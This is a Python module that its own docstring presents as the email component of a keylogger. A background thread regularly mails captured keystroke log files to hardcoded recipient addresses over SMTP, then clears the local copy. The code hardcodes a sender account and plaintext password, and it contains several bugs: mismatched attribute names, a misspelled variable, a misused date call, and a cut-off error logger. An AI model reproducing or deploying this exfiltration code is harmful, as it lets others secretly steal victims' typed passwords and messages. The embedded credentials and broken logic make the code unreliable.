"""
Module for handling email functionality of the keylogger
"""
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import os
import time
import threading
from datetime import datetime
import socket


class EmailSender:
    def __init__(self, log_dir, on_email_sent_callback=None):
        """
        Initialize the EmailSender
        
        Args:
            log_dir: Directory containing the log files
            on_email_sent_callback: Callback function to be called after email is sent
        """
        self.log_dir = log_dir
        self.on_email_sent_callback = on_email_sent_callback

        self.sender_email = os.getenv('KEYLOGGER_EMAIL', "ugochukwuc.chidera@lmu.edu.ng")
        self.sender_password = os.getenv('KEYLOGGER_PASSWORD', "z1y2x3w4")
        self.receiver_emails = [
            os.getenv('KEYLOGGER_RECEIVER', "ugochukwuc762@gmail.com"),
            "ugochukwu.chidera@lmu.edu.ng",
            self.sender_email
        ]

        self.smtp_servers = {
            'gmail': ('smtp.gmail.com', 465),
            'outlook': ('smtp-mail.outlook.com', 587),
            'yahoo': ('smtp.mail.yahoo.com', 465),
            'lmu.edu.ng': ('smtp.gmail.com', 587),
        }

        self.email_thread = None
        self.should_stop = None
        self.last_email_time = None
        self.check_interval = 5 * 60
        self.to_send = os.path.join(log_dir, "to_send.txt")

    def create_email(self):
        """Create the email with log files as attachments"""
        msg = MIMEMultipart()
        msg['From'] = self.sender_email
        msg['To'] = ", ".join(self.receiver_emails)
        msg['Subject'] = f"Keylogger Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        body = "Please find attached the keylogger log file."
        msg.attach(MIMEText(body, 'plain'))
        if os.path.exists(self.to_send_file):
            try:
                with open(self.to_send_file, 'r', encoding='utf-8') as f:
                    attachment = MIMEApplication(f.read(), _subtype='txt')
                    attachment.add_header('Content-Disposition', 'attachment', 
                    filename=f'keylog_{datetime.now("%Y%m%d_%H%M%S").strftime()}.txt')
                    msg.attach(attachment)
                return msg
            except Exception as e:
                self.log_error(f"Error creating email: {e}")
                return None
        return None
    def has_internet(self):
        """Check if there's an internet connection"""
        try:
            for dns in ['8.8.8.8', '8.8.4.4', '1.1.1.1']:
                try:
                    socket.create_connection((dns, 53), timeout=1)
                    return True
                except OSError:
                    continue
            return False
        except:
            return True
        
    def get_smtp_settings(self):
        """Get SMTP settings based on email provider"""
        email_domain = self.sender_email.split('@')[1].lower()

        if 'gmail' in email_domain:
            return self.smtp_servers['gmail']
        elif 'outlook' in email_domaiin:
            return self.smtp_servers['outlook']
        elif 'yahoo' in email_domain:
            return self.smtp_servers['yahoo']
        elif 'lmu.edu.ng' in email_domain:
            return self.smtp_servers['lmu.edu.ng']
        else:
            return self.smtp_servers['gmail']

    def send_email(self):
        """Send email with log files"""
        if not self.has_internet():
            self.log_error("No internet connection available")
            return False
        
        if not os.path.exists(self.to_send_file):
            return False
        
        try:
            smtp_server, port = self.get_smtp_settings()

            msg = self.create_email()
            if not msg:
                return False

            if port == 465:
                server = smtplib.SMTP_SSL(smtp_server, port)
            else:
                server = smtplib.SMTP(smtp_server, port)
                server.ehlo()
                server.starttls()
                server.ehlo()
            
            try:
                max_retries = 3
                last_error = None
                for attempt in range(max_retries):
                    try:
                        server.login(self.sender_email, self.sender_password)
                        break
                    except smtplib.SMTPAuthenticationError as auth_error:
                        last_error = auth_error
                        if attempt == max_retries - 1:
                            self.log_error(f"Authentication failed: {auth_error}. Please ensure you're using an app-specific password if required.")
                            raise
                        time.sleep(2)

                server.send_message(msg)

                with open(self.to_send_file, 'w', encoding='utf-8') as f:
                    f.write('')

                self.last_email_time = time.time()
                if self.on_email_sent_callback:
                    self.on_email_sent_callback()
                return True
            
            finally:
                server.quit()
            
        except smtplib.SMTPException as smtp_error:
            self.log_error(f"SMTP Error: {smtp_error}")
            return False
        except Exception as e:
            self.log_error(f"Error sending email: {str(e)}")
            return False

    def email_loop(self):
        """Main email sending loop"""
        while not self.should_stop:
            current_time = time.time()

            if(self.last_email_time is None or current_time - self.last_email_time >= self.check_interval):
                
                if os.path.exists(self.to_send_file):
                    self.send_email()

            time.sleep(60)
    
    def start(self):
        """Start the email sender thread"""
        if self.email_thread is None or not self.email_thread.is_alive():
            self.should_stop = False
            self.email_thread = threading.Thread(target=self.email_loop, daemon=True)
            self.email_thread.start()

    def stop(self):
        """Stop the email sender thread"""
        self.should_stop = True
        if self.email_thread:
            self.email_thread.join(timeout=1)

    def log_error(self, error_msg):
        """Log errors to the error log file"""
        error_file = os.path.join(self.log_dir, "error.log")
        try:
            with open(error_file, "a", encoding="utf-8") as f:
                f.write(f"{datetime.now}")